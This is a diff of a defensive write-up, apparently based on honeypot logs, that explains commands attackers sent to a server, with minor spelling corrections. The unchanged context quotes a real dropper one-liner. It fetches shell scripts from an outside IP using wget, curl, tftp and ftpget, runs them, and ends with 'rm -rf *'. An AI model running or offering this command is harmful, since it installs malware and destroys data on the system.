@@ -121,7 +121,7 @@ Why a malicious user may use it: They're checking if your server is acting as an
 
 `/usr/bin/qmuxd, /var/qmux_connect_socket, /etc/config/simman `
 
-What it is: qmuxd is a daemon used in Qualcomm-based modems for managing communication between the OS and the cellular modem (via QMI). simman likely refers to SIM management tools on embedded Linux systems or routers. 
+What it is: qmuxd is a daemon used in Qualcomm-based modems for managing communication between the OS and the cellular modem (via QMI). Simman likely refers to SIM management tools on embedded Linux systems or routers. 
 Why a malicious user may use it: This command is part of a targeted script that checks if your system: 
 - Has a SIM card or LTE modem. 
 - Is running an SMS gateway or cellular router setup. 
@@ -140,6 +140,6 @@ This attacker only tried to run one command:
 
 `cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.178.235.240/ohshit.sh; curl -O http://103.178.235.240/ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh; tftp 103.178.235.240 -c get ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh; tftp -r ohshit2.sh -g 103.178.235.240; chmod 777 ohshit2.sh; sh ohshit2.sh; ftpget -v -u anonymous -p anonymous -P 21 103.178.235.240 ohshit1.sh ohshit1.sh; sh ohshit1.sh; rm -rf ohshit.sh ohshit.sh ohshit2.sh ohshit1.sh; rm -rf *`
 
-Purpose: The script first attempts to change directories to a series of locations on the local system (/tmp, /var/run, /mnt, /root, or /), presumably trying to find an accessible location to operate from.  It then tries to download a presumably malicous file using three different download methids (curl, tftp, and ftpget)
+Purpose: The script first attempts to change directories to a series of locations on the local system (/tmp, /var/run, /mnt, /root, or /), presumably trying to find an accessible location to operate from.  It then tries to download a presumably malicous file using three different download methods (curl, tftp, and ftpget)
 
 
